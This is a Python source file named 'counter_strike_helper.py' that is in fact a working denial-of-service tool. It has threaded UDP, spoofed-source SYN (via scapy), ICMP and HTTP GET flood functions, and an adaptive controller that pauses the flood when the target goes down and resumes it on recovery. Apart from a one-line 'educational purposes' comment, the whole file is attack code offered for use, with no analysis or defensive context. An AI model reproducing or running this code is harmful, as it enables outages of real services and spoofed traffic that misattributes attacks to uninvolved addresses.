# counter_strike_helper.py

import socket
import string
import random
import threading
import time
from scapy.all import *
from scapy.layers.inet import IP, ICMP, TCP


# ==============================================================================
# WARNING: This is a Denial of Service (DoS) script for educational purposes.
# ==============================================================================

# --- 1. UTILITY AND SHARED WORKER FUNCTIONS ---

def resolve_to_ipv4(target_url):
    """Resolves a hostname to a list of its IPv4 addresses."""
    try:
        # getaddrinfo is the modern and correct way to resolve hosts
        addr_info = socket.getaddrinfo(target_url, None, family=socket.AF_INET)
        # Use a set to automatically handle duplicate IPs
        ips = {item[4][0] for item in addr_info}
        return sorted(list(ips))
    except socket.gaierror:
        return []


def generate_random_ip():
    """Generates a random, non-private IP address for spoofing."""
    while True:
        ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
        if not (ip.startswith("10.") or ip.startswith("192.168.") or ip.startswith("172.16.")):
            return ip


# --- 2. ADAPTIVE ATTACK CONTROLLER MODULE ---

def check_service_status(target_ip, port, timeout=2):
    """Checks if a TCP service is online by attempting to connect to a port."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(timeout)
            if sock.connect_ex((target_ip, port)) == 0:
                return True  # Service is UP
    except Exception:
        pass
    return False  # Service is DOWN or unreachable


def adaptive_attack_controller(target_ip, check_port, stop_event, pause_event, check_interval=10):
    """
    A controller that runs in the background, checks target status,
    and pauses/resumes the attack accordingly.
    """
    print(f"\n[CONTROLLER] Adaptive controller started. Monitoring {target_ip}:{check_port} every {check_interval}s.")
    while not stop_event.is_set():
        is_online = check_service_status(target_ip, check_port)
        if is_online:
            if pause_event.is_set():
                print(f"\n[CONTROLLER] Target has recovered! Resuming attack...")
                pause_event.clear()  # Clear the pause, threads will resume
        else:
            if not pause_event.is_set():
                print(f"\n[CONTROLLER] Target is down! Pausing attack to conserve resources...")
                pause_event.set()  # Set the pause, threads will wait
        time.sleep(check_interval)
    print("\n[CONTROLLER] Main attack stopped. Shutting down.")


# --- 3. REFACTORED ATTACK WORKERS AND CONTROLLERS ---

# --- UDP Flood ---
def udp_worker(stop_event, pause_event, target_ip, port, packet_size):
    """Worker thread that sends a continuous stream of UDP packets."""
    data = b'\x99' * packet_size
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect((target_ip, port))
            while not stop_event.is_set():
                if pause_event.is_set():
                    time.sleep(1)
                    continue
                s.send(data)
    except socket.error:
        pass


def attack_UDP(method, target_url, port, duration, stop_event, pause_event, threads=150):
    """Controller for UDP flood attacks."""
    ips = resolve_to_ipv4(target_url)
    if not ips: return

    attack_end_time = time.time() + duration
    all_threads = []

    for ip in ips:
        packet_sizes = []
        if method == "UDP-Flood":
            packet_sizes = [375] * threads
        elif method == "UDP-Power":
            packet_sizes = [750] * threads
        elif method == "UDP-Mix":
            packet_sizes = [375] * (threads // 2) + [750] * (threads // 2)

        for size in packet_sizes:
            t = threading.Thread(target=udp_worker, args=(stop_event, pause_event, ip, port, size))
            t.daemon = True
            t.start()
            all_threads.append(t)

    while time.time() < attack_end_time and not stop_event.is_set():
        time.sleep(1)

    stop_event.set()  # Signal threads to stop if duration expires


# --- SYN Flood ---
def syn_worker(stop_event, pause_event, target_ip, port):
    """Worker thread that sends a continuous stream of spoofed SYN packets."""
    while not stop_event.is_set():
        if pause_event.is_set():
            time.sleep(1)
            continue
        try:
            spoofed_ip = generate_random_ip()
            send(IP(src=spoofed_ip, dst=target_ip) / TCP(dport=port, sport=RandShort(), flags="S"), verbose=0)
        except Exception:
            pass


def synflood(target_url, port, duration, stop_event, pause_event, threads=150):
    """Controller for SYN flood attacks."""
    ips = resolve_to_ipv4(target_url)
    if not ips: return

    attack_end_time = time.time() + duration
    all_threads = []

    for ip in ips:
        for _ in range(threads):
            t = threading.Thread(target=syn_worker, args=(stop_event, pause_event, ip, port))
            t.daemon = True
            t.start()
            all_threads.append(t)

    while time.time() < attack_end_time and not stop_event.is_set():
        time.sleep(1)

    stop_event.set()


# --- ICMP Flood ---
def icmp_worker(stop_event, pause_event, target_ip):
    """Worker thread that sends a continuous stream of ICMP packets."""
    while not stop_event.is_set():
        if pause_event.is_set():
            time.sleep(1)
            continue
        try:
            send(IP(dst=target_ip) / ICMP(), verbose=0)
        except Exception:
            pass


def icmpflood(target_url, duration, stop_event, pause_event, threads=150):
    """Controller for ICMP flood attacks."""
    ips = resolve_to_ipv4(target_url)
    if not ips: return

    attack_end_time = time.time() + duration
    all_threads = []

    for ip in ips:
        for _ in range(threads):
            t = threading.Thread(target=icmp_worker, args=(stop_event, pause_event, ip))
            t.daemon = True
            t.start()
            all_threads.append(t)

    while time.time() < attack_end_time and not stop_event.is_set():
        time.sleep(1)

    stop_event.set()


# --- HTTP Flood ---
def http_worker(stop_event, pause_event, target_ip, port, host_header):
    """Worker thread that sends a continuous stream of HTTP GET requests."""
    while not stop_event.is_set():
        if pause_event.is_set():
            time.sleep(1)
            continue
        url_path = "".join(random.sample(string.ascii_letters + string.digits, 5))
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(4)
                s.connect((target_ip, port))
                request = f"GET /{url_path} HTTP/1.1\nHost: {host_header}\n\n".encode()
                s.send(request)
        except socket.error:
            # We expect errors when the server is down
            time.sleep(0.5)


def attack_http_flood(target_url, port, duration, stop_event, pause_event, threads=150):
    """Controller for HTTP flood attacks."""
    ips = resolve_to_ipv4(target_url)
    if not ips: return

    attack_end_time = time.time() + duration
    all_threads = []

    for ip in ips:
        for _ in range(threads):
            t = threading.Thread(target=http_worker, args=(stop_event, pause_event, ip, port, target_url))
            t.daemon = True
            t.start()
            all_threads.append(t)

    while time.time() < attack_end_time and not stop_event.is_set():
        time.sleep(1)

    stop_event.set()